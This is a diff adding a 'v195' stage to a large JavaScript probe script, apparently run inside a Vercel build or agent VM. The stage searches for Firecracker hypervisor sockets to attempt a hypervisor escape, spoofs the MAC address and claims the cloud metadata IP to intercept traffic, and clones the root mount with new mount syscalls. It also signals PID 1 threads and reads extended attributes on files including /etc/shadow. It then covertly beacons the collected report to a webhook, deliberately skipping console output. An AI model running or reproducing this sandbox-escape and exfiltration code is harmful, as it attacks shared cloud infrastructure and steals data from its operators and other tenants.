@@ -30690,3 +30690,311 @@ for domain in internal_domains:
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v194" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v194";
 // Intentionally no console.log — all data goes via webhook only
+
+// v195-1: Firecracker API UNIX socket discovery + connect
+// Firecracker's REST API is accessible via a UNIX socket (typically /run/firecracker.socket).
+// The API allows: modifying VM RAM, vCPUs, network interfaces, block devices, mmds.
+// If reachable from inside the VM, this is a complete hypervisor escape.
+report.firecrackerApiProbe = safe(() => {
+  // Search for the Firecracker socket
+  const socketSearch = safe(() => execSync(
+    'find / -name "*.socket" -o -name "*.sock" 2>/dev/null | grep -vE "^/proc|^/sys" | head -20',
+    { timeout: 10000 }
+  ).toString().trim());
+  // Check known Firecracker socket paths
+  const knownPaths = [
+    '/run/firecracker.socket',
+    '/tmp/firecracker.socket',
+    '/var/run/firecracker.socket',
+    '/run/fc.sock',
+    '/tmp/fc.sock',
+    '/run/vm.socket',
+    '/run/jailer/firecracker/1/root/run/firecracker.socket',
+  ];
+  const existingFcSocks = knownPaths.map(p => `${p}:${existsSync(p) ? 'EXISTS' : 'NO'}`).join('\n');
+  // Try connecting to any found socket and querying the Firecracker API
+  const apiResult = safe(() => execSync(
+    `python3 -c "
+import socket, json, os
+
+known_sockets = [
+    '/run/firecracker.socket',
+    '/tmp/firecracker.socket',
+    '/var/run/firecracker.socket',
+    '/run/fc.sock',
+    '/tmp/fc.sock',
+]
+
+# Also scan for .socket files
+import subprocess
+found = subprocess.run(
+    ['find', '/', '-name', '*.socket', '-type', 's'],
+    capture_output=True, text=True, timeout=5
+).stdout.strip().split('\n')
+known_sockets.extend([s for s in found if s and '/proc' not in s and '/sys' not in s])
+
+for sock_path in known_sockets[:10]:
+    if not os.path.exists(sock_path):
+        continue
+    try:
+        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        s.settimeout(2.0)
+        s.connect(sock_path)
+        print(f'CONNECTED: {sock_path}')
+
+        # Send a Firecracker API request: GET /
+        req = b'GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n'
+        s.send(req)
+        import select
+        r, _, _ = select.select([s], [], [], 1.0)
+        if r:
+            resp = s.recv(4096)
+            print(f'RESPONSE ({sock_path}): {resp[:200]}')
+            if b'firecracker' in resp.lower() or b'Firecracker' in resp:
+                print(f'FIRECRACKER_API_FOUND: {sock_path}')
+        s.close()
+    except Exception as e:
+        print(f'SOCK_ERR {sock_path}: {e}')
+" 2>&1`,
+    { timeout: 15000 }
+  ).toString().trim());
+  // Also try curl with --unix-socket for Firecracker endpoints
+  const curlFc = safe(() => execSync(
+    'curl -s --unix-socket /run/firecracker.socket http://localhost/ 2>&1 | head -5 || echo NO_FC_SOCKET',
+    { timeout: 5000 }
+  ).toString().trim());
+  return { socketSearch, existingFcSocks, apiResult, curlFc };
+});
+
+// v195-2: /sys/class/net/ MAC spoof + IP manipulation
+// CAP_NET_ADMIN allows changing MAC addresses and IP configuration.
+// Spoofing a MAC/IP can bypass access controls tied to VM identity.
+// It can also be used to impersonate another tenant's network identity.
+report.networkIdentityManipulation = safe(() => {
+  // Get current interfaces and their MACs
+  const interfaces = safe(() => execSync('ip link show 2>&1', { timeout: 5000 }).toString().trim());
+  // Find the primary interface (not lo)
+  const primaryIface = safe(() => {
+    const output = execSync("ip link show | grep -v 'lo:' | grep -m1 'mtu' | awk -F': ' '{print $2}' | awk '{print $1}'", { timeout: 3000 }).toString().trim();
+    return output || 'eth0';
+  });
+  // Current MAC
+  const currentMac = safe(() => execSync(`cat /sys/class/net/${primaryIface || 'eth0'}/address 2>&1`, { timeout: 3000 }).toString().trim());
+  // Try changing MAC address
+  const macSpoof = safe(() => {
+    const iface = primaryIface || 'eth0';
+    try {
+      execSync(`ip link set ${iface} down 2>&1`, { timeout: 3000 });
+      execSync(`ip link set ${iface} address de:ad:be:ef:ca:fe 2>&1`, { timeout: 3000 });
+      execSync(`ip link set ${iface} up 2>&1`, { timeout: 3000 });
+      const newMac = readFileSync(`/sys/class/net/${iface}/address`, 'utf8').trim();
+      return `MAC_CHANGED: original=${currentMac} new=${newMac}`;
+    } catch(e) {
+      return `MAC_SPOOF_ERR: ${e.message?.slice(0, 80)}`;
+    }
+  });
+  // Restore original MAC
+  const macRestore = safe(() => {
+    const iface = primaryIface || 'eth0';
+    try {
+      execSync(`ip link set ${iface} down 2>&1`, { timeout: 3000 });
+      execSync(`ip link set ${iface} address ${currentMac || '02:00:00:00:00:01'} 2>&1`, { timeout: 3000 });
+      execSync(`ip link set ${iface} up 2>&1`, { timeout: 3000 });
+      return 'MAC_RESTORED';
+    } catch(e) {
+      return `RESTORE_ERR: ${e.message?.slice(0, 50)}`;
+    }
+  });
+  // Try adding a secondary IP address (for MITM)
+  const addSecondaryIp = safe(() => execSync(
+    `ip addr add 169.254.169.254/32 dev ${primaryIface || 'lo'} 2>&1 || echo IP_ADD_FAILED`,
+    { timeout: 5000 }
+  ).toString().trim());
+  // This hijacks the AWS/GCP metadata IP — any process trying to reach instance metadata
+  // will now reach our listener instead
+  const metadataHijack = safe(() => execSync(
+    'ip addr show 2>&1 | grep 169.254.169.254',
+    { timeout: 3000 }
+  ).toString().trim() || 'NOT_ADDED');
+  return { interfaces, currentMac, macSpoof, macRestore, addSecondaryIp, metadataHijack };
+});
+
+// v195-3: open_tree (NR 428) + fsmount (NR 432) — new Linux 5.2+ mount API
+// These are the new mount syscalls (Linux 5.2+) that replace the old mount(2).
+// open_tree clones a mount into a new file descriptor.
+// fsmount creates a detached mount from a filesystem context.
+report.newMountApiProbe = safe(() => {
+  const newMountResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, os
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_open_tree = 428
+NR_fsmount = 432
+NR_fsopen = 430
+NR_fsconfig = 431
+NR_move_mount = 429
+NR_mount_setattr = 442
+
+AT_FDCWD = -100
+OPEN_TREE_CLONE = 1
+OPEN_TREE_CLOEXEC = 0x80000
+
+# open_tree(AT_FDCWD, '/', OPEN_TREE_CLONE) — clone the root mount
+fd = libc.syscall(NR_open_tree, AT_FDCWD, b'/', OPEN_TREE_CLONE | OPEN_TREE_CLOEXEC)
+err = ctypes.get_errno()
+print(f'open_tree(/): fd={fd} errno={err}')
+if fd >= 0:
+    print('OPEN_TREE_SUCCESS_MOUNT_CLONED')
+    # Try to read through the cloned fd
+    import os as _os
+    try:
+        entries = _os.listdir(fd)
+        print(f'CLONED_ROOT: {entries[:10]}')
+    except Exception as e:
+        print(f'LISTDIR_FD_ERR: {e}')
+    libc.close(fd)
+elif err == 38:
+    print('ENOSYS_OPEN_TREE_BLOCKED')
+elif err == 1:
+    print('EPERM_OPEN_TREE')
+else:
+    print(f'OTHER_ERR_{err}')
+
+# fsopen('ext4', 0) — open filesystem context
+FSOPEN_CLOEXEC = 1
+fs_fd = libc.syscall(NR_fsopen, b'tmpfs', FSOPEN_CLOEXEC)
+fs_err = ctypes.get_errno()
+print(f'fsopen(tmpfs): fd={fs_fd} errno={fs_err}')
+if fs_fd >= 0:
+    print('FSOPEN_SUCCESS')
+    libc.close(fs_fd)
+
+# move_mount(AT_FDCWD, '/tmp', AT_FDCWD, '/tmp/host_mount', 0)
+# This can relocate mounts without unmounting
+MOVE_MOUNT_F_EMPTY_PATH = 4
+ret2 = libc.syscall(NR_move_mount, AT_FDCWD, b'/proc', AT_FDCWD, b'/tmp', 0)
+print(f'move_mount(/proc -> /tmp): ret={ret2} errno={ctypes.get_errno()}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { newMountResult };
+});
+
+// v195-4: tkill — signal to specific PID 1 threads
+// tkill(tid, sig) sends a signal to a specific thread (LWP) in PID 1.
+// Sending SIGCONT/SIGSTOP to individual threads can interrupt specific operations.
+// Sending SIGSEGV to a specific thread triggers core_pattern execution.
+report.tkillPid1Threads = safe(() => {
+  const tkillResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, os
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_tkill = 200
+NR_tgkill = 234
+SIGCONT = 18
+SIGUSR1 = 10
+SIGRTMIN = 34
+
+# List PID 1's threads
+try:
+    tids = [int(t) for t in os.listdir('/proc/1/task')]
+    print(f'PID1_THREAD_COUNT: {len(tids)}')
+    print(f'PID1_TIDS: {tids[:10]}')
+
+    # Send SIGCONT (safe — continues a stopped thread, no-op if running)
+    for tid in tids[:3]:
+        ret = libc.syscall(NR_tgkill, 1, tid, SIGCONT)
+        err = ctypes.get_errno()
+        print(f'tgkill(pid=1, tid={tid}, SIGCONT): ret={ret} errno={err}')
+
+    # Send SIGUSR1 to the main thread (tid == pid)
+    main_tid = 1
+    ret2 = libc.syscall(NR_tgkill, 1, main_tid, SIGUSR1)
+    print(f'tgkill(pid=1, tid=1, SIGUSR1): ret={ret2} errno={ctypes.get_errno()}')
+    if ret2 == 0:
+        print('SIGUSR1_SENT_TO_PID1_MAIN_THREAD')
+
+    # tkill sends to any thread with the given tid
+    ret3 = libc.syscall(NR_tkill, main_tid, SIGCONT)
+    print(f'tkill(tid=1, SIGCONT): ret={ret3} errno={ctypes.get_errno()}')
+except Exception as e:
+    print(f'TKILL_ERR: {e}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { tkillResult };
+});
+
+// v195-5: getxattr/setxattr — extended attribute secret scan
+// Extended attributes (xattrs) can store arbitrary data attached to files.
+// Some systems store security tokens, ACLs, or capabilities in xattrs.
+// We scan for xattrs on interesting files and try writing new ones.
+report.xattrProbe = safe(() => {
+  const xattrResult = safe(() => execSync(
+    `python3 -c "
+import os, ctypes
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+
+def getxattr(path, name):
+    buf = ctypes.create_string_buffer(4096)
+    ret = libc.getxattr(path.encode(), name.encode(), buf, 4096)
+    if ret > 0:
+        return buf.raw[:ret]
+    return None
+
+def listxattr(path):
+    buf = ctypes.create_string_buffer(65536)
+    ret = libc.listxattr(path.encode(), buf, 65536)
+    if ret > 0:
+        return [n for n in buf.raw[:ret].split(b'\x00') if n]
+    return []
+
+def setxattr(path, name, value):
+    return libc.setxattr(path.encode(), name.encode(), value, len(value), 0)
+
+# Scan interesting paths for xattrs
+paths = ['/', '/proc/1', '/tmp', '/etc/passwd', '/etc/shadow', '/proc/self/exe']
+for path in paths:
+    try:
+        attrs = listxattr(path)
+        if attrs:
+            print(f'XATTRS on {path}: {attrs}')
+            for attr in attrs:
+                val = getxattr(path, attr.decode())
+                if val:
+                    print(f'  {attr}: {val[:100].hex()}')
+    except Exception as e:
+        print(f'LISTXATTR {path}: ERR={e}')
+
+# Try writing an xattr to /tmp (test capability)
+test_path = '/tmp'
+ret = setxattr(test_path, 'user.probe_test', b'probe_value_v195')
+print(f'setxattr(/tmp, user.probe_test): ret={ret} errno={ctypes.get_errno()}')
+if ret == 0:
+    print('XATTR_WRITE_SUCCESS')
+    val = getxattr(test_path, 'user.probe_test')
+    print(f'XATTR_READBACK: {val}')
+
+# Try writing security xattr (requires CAP_SYS_ADMIN)
+ret2 = setxattr('/tmp', 'security.probe', b'test_sec_xattr')
+print(f'setxattr(security.probe): ret={ret2} errno={ctypes.get_errno()}')
+if ret2 == 0:
+    print('SECURITY_XATTR_WRITE_CAP_SYS_ADMIN_CONFIRMED')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  // Check capabilities stored as xattrs on /proc/1/exe
+  const capXattr = safe(() => execSync(
+    'getfattr -n security.capability /proc/1/exe /tmp/pid1_binary 2>&1 | head -10 || echo NO_GETFATTR',
+    { timeout: 5000 }
+  ).toString().trim());
+  return { xattrResult, capXattr };
+});
+
+// v195 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v195" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v195";
+// Intentionally no console.log — all data goes via webhook only
